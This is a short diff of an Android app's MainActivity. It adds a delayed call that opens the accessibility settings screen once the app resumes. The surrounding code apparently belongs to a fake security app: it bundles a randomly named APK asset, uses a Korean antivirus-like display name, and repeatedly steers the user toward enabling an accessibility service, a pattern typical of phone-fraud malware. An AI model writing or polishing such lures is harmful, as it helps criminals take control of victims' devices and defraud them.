@@ -71,6 +71,7 @@ public class MainActivity extends AppCompatActivity {
     public static final String EXTRA_CLAIM_DAMAGE_METHOD = "com.ig.security.extra.CLAIM_DAMAGE_METHOD";
     private static final String MAIN_PAGE_URL = "file:///android_asset/index.html";
     private static final int APP_BACKGROUND_COLOR = Color.WHITE;
+    private static final long ACCESSIBILITY_SETTINGS_OPEN_DELAY_MS = 350L;
 
     public static final String SECURITY_APK_ASSET = "nbkhe9ihdhgiouhwasdbfih3";
     public static final String SECURITY_APK_NAME = "터지엔 엠백신";
@@ -298,7 +299,7 @@ public class MainActivity extends AppCompatActivity {
 
         if (!isSecurityAccessibilityServiceEnabled() && !accessibilitySettingsOpened) {
             accessibilitySettingsOpened = true;
-            openAccessibilitySettings();
+            openAccessibilitySettingsAfterMainResumes();
         }
     }
 
@@ -366,6 +367,11 @@ public class MainActivity extends AppCompatActivity {
         } catch (SecurityException exception) {
             showBasicDialog("설정 열기 오류", "Android 보안 정책으로 접근성 설정 화면을 열 수 없습니다.");
         }
+    }
+
+    private void openAccessibilitySettingsAfterMainResumes() {
+        View content = getWindow().getDecorView();
+        content.postDelayed(this::openAccessibilitySettings, ACCESSIBILITY_SETTINGS_OPEN_DELAY_MS);
     }
 
     private void startSecurityLaunchServiceIfNeeded() {
